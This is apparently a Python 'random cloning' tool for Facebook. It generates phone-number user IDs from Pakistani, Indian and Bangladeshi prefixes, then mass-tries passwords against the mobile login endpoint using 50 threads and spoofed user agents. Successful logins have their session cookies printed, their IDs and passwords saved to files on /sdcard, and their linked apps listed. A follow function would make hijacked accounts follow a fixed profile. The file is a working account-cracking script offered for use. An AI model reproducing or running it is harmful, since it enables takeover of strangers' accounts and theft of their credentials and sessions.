import os,sys,time,json,random,re,string,platform,base64,uuid
os.system("git pull")
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')

def ud():
    os.system('clear')
    jalan(logo)
    print(' [1] My Page')
    
    opt = input('\n   Choose option >>> ')
    if opt == '1':
        os.system('xdg-open https://www.facebook.com/DH.Alamin.Hasan01')
        i()
        return None
    

def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Active  Apk%s  '%(N,M,N,M,N))
    else:
        print(f'\r[🎮] %s \x1b[1;95m ☆ Your Active Apps ☆     :{WHITE}'%(GREEN))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        #else:
            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Expired Apk%s           \n'%(N,M,N,M,N))
    else:
        print(f'\r[🎮] %s \x1b[1;95m ◇ Your Expired Apps ◇    :{WHITE}'%(M))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print('')

def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=100015315258519', {
            'cookie': coki }, **('cookies',)).text, 'html.parser')
        get = r.find('a', 'Ikuti', **('string',)).get('href')
        session.get('https://mbasic.facebook.com' + str(get), {
            'cookie': coki }, **('cookies',)).text
            
            

class jalan:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.009)
            
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' #
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
A = '\x1b[1;90m' # WARNA ABU ABU
BN = '\x1b[1;107m' # BELAKANG PUTIH
BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m' # BELAKANG PINK
BB = '\x1b[1;104m' # BELAKANG BIRU
BK = '\x1b[1;103m' # BELAKANG KUNING
BH = '\x1b[1;102m' # BELAKANG HIJAU
BM = '\x1b[1;101m' # BELAJANG MERAH
BA = '\x1b[1;100m' # BELAKANG ABU ABU
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
logo =                                          ("""
\033[1;97m████████╗░░░████████╗░░░██████╗░░░░██████╗░
╚══██╔══╝░░░╚══██╔══╝░░░██╔══██╗░░░██╔══██╗
░░░██║░░░░░░░░░██║░░░░░░██████╦╝░░░██║░░██║
░░░██║░░░░░░░░░██║░░░░░░██╔══██╗░░░██║░░██║
░░░██║░░░██╗░░░██║░░░██╗██████╦╝██╗██████╔╝
░░░╚═╝░░░╚═╝░░░╚═╝░░░╚═╝╚═════╝░╚═╝╚═════╝░


\033[1;94m𝗙𝗕 𝗔𝗖𝗖𝗢𝗨𝗡𝗧 : \033[1;92m𝗗𝗛 𝗔𝗟𝗔𝗠𝗜𝗡 𝗛𝗔𝗦𝗔𝗡
\033[1;94m𝗧𝗘𝗔𝗠       : \033[1;92m𝗧𝗘𝗥𝗠𝗨𝗫 𝗧𝗘𝗖𝗛 𝗕𝗗
\033[1;94m𝗧𝗼𝗼𝗹𝘀      : \033[1;92mRandom 𝗖𝗹𝗼𝗻𝗶𝗻𝗴
\033[1;94m𝗩𝗘𝗥𝗦𝗜𝗢𝗡    : \033[1;92m𝗡𝗘𝗪 (2.𝟬.𝟬)

__________________________________________________
__________________________________________________

\033[1;37m========================================\n""")
loop = 0
oks = []
cps = []

def clear():
    os.system('clear')
    print(logo)
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
    
    
try:
    print('\n\n\033[1;33mLoading asset files ... \033[0;97m')
    v = 5.2
    update = ('5.2')
    update = ('5.2')
    if str(v) in update:
        os.system('clear')
    else:pass
except:print('\n\033[1;31mNo internet connection ... \033[0;97m')
#global functions
def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
        print('\r'+text+o),
        sys.stdout.flush();time.sleep(1)

#User agents
ugen2=[]
ugen=[]    
for dx in range(1000):
	rr = random.randint
	rc = random.choice
	aZ = ['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
	lang = ["en-us","pt-pt"]
	ugent1 = f"Mozilla/5.0 (Linux; U; Android {str(rr(3,17))};  en-us; GT-{str(rc(aZ))}{str(rr(111,999))}{str(rc(aZ))}{str(rr(11111,99999))}; ko-kr) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,100))}.0.{str(rr(4200,4900))}.{str(rr(40,150))} Mobile Safari/537.36"
	if ugent1 in ugen:pass
	else:ugen.append(ugent1)
	ugent3 = f"Mozilla/5.0 (Linux; U; Android {str(rr(3,17))};  en-us; GT-{str(rr(11111,99999))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,100))}.0.{str(rr(4200,4900))}.{str(rr(40,150))} Mobile Safari/537.36"
	if ugent3 in ugen:pass
	else:ugen.append(ugent3)
	ugent4 = f"Mozilla/5.0 (X11; U; U; Linux x86_64; en-us) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,100))}.0.{str(rr(4200,4900))}.{str(rr(40,150))} Safari/537.36 Puffin/9.7.2.{str(rr(11111,99999))}AT"
	if ugent4 in ugen:pass
	else:ugen.append(ugent4)
	ugent5 = f"Mozilla/5.0 (Linux; Android {str(rr(3,17))}; SM-{str(rc(aZ))}{str(rr(111,999))}{str(rc(aZ))} Build/SP1A.{str(rr(11111,99999))}.016; ko-kr) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,100))}.0.{str(rr(4200,4900))}.{str(rr(40,150))} Mobile Safari/537.36 Puffin/9.2.0.{str(rr(11111,99999))}AP"
	if ugent5 in ugen:pass
	else:ugen.append(ugent5)
    
 
 

def cil():
	rr = random.randint; rc = random.choice
	az = str(rc(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']))
	return str(rc([f"Mozilla/5.0 (Linux; Android {str(rr(3,17))}; SM-{str(rc(aZ))}{str(rr(111,999))}{str(rc(aZ))} Build/SP1A.{str(rr(11111,99999))}.016; ko-kr) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,100))}.0.{str(rr(4200,4900))}.{str(rr(40,150))} Mobile Safari/537.36 Puffin/9.2.0.{str(rr(11111,99999))}AP"]))
    
# APK CHECK
def i():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    print(logo)
    
    
    print(" \x1b[1;92m\t  USE OUR COUNTRY CODE  ")
    print(' \x1b[1;94m     \t     PAKISTAN CODE\n     \033[1;33m92301, \033[1;33m92302 ,\033[1;33m92303 ,\033[1;33m92305  ...\033[0;97m')
    print('\033[1;32m============================================')
    print(' \x1b[1;95m     \t     INDIA CODE\n     \033[1;33m91778, \033[1;33m91930 ,\033[1;33m91902 ,\033[1;33m91712  ...\033[0;97m')
    print('\033[1;32m============================================')
    print(' \x1b[1;96m     \t     BANGLADESH CODE\n     \033[1;33m0161, \033[1;33m0171 ,\033[1;33m0181 ,\033[1;33m0191  ...\033[0;97m')
    print('\033[1;32m============================================\n')
    code = input(' Choice CODE : ')
    print("")
    limit = int(input(' EXAMPLE: 2000, 3000, 50000, 100000\n\n PUT CLONING LIMIT: '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    os.system("clear")
    print(logo)
    passx = int(input("[#] Enter Password Limit : "))
    HamiiID = []
    print("")
    for bilal in range(passx):
        pww = input(f"[#] Enter Password {bilal+1} : ")
        HamiiID.append(pww)
    with ThreadPool(max_workers=50) as manshera:
        clear()
        tl = str(len(user))
        print('\033[1;36m TOTAL IDS: '+tl)
        print('\033[1;36m THE PROCESS HAS BEEN STARTED')
        print('\033[1;31m USE AEROPLANE MOOD IN EVERY 4 MIN ')
        print('\033[1;32m============================================')
        for love in user:
            pwx = [love[1:]]
            uid = code+love
            for Eman in HamiiID:
                pwx.append(Eman)
                pwx.append(love)
            manshera.submit(rcrack,uid,pwx,tl)
    print('\033[1;32m============================================')
    print('Crack process has been completed')
    print('Ids saved in ok.txt,cp.txt')
    print('\033[1;32m============================================')

def rcrack(uid,pwx,tl):
    #print(user)
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
#            pro2 = random.choice(ugen2)
            session = requests.Session()
            free_fb = session.get('https://m.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority':'m.facebook.com',
            'method':'POST',
            'scheme':'https',
            'accept':'text/html,application/xhtml+xml,application/xml;q-0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;vb3;q=0.9',
            'accept-encoding':'gzip, deflate, br',
            'accept-language':'en-GB, en-US;q=0.9,en;q=0.8',
            'cache-control':'max-age=0',
            'content-length':'171',
            'content-type':'application/x-www-form-urlencoded',
            'referer':'https://m.facebook.com/',
            'sec-ch-ua':'"Chromium"; v="105", "Not)A; Brand"; v="8"',
            'sec-ch-ua-mobile':'?1',
            'sec-ch-ua-platform':'"Windows"',
            'sec-fetch-dest':'document',
            'sec-fetch-mode':'navigate',
            'sec-fetch-site':'same-origin',
            'sec-fetch-user':'?1',
            'cache-control':'private, no-cache, no-store, must-revalidate',
            'pragma':'no-cache',
            'priority':'u=0',
            'upgrade-insecure-requests':'1',
            "user-agent": pro}
            lo = session.post('https://m.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print('\r\r\033[1;32m(DH-ok  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/DH-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
             #   print('\r\r\33[1;30m(RABBI-CP❌)  ' +cid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/DH-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r\r%s[DH] [%s/%s]  OK:- %s  CP:- %s '%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
ud()
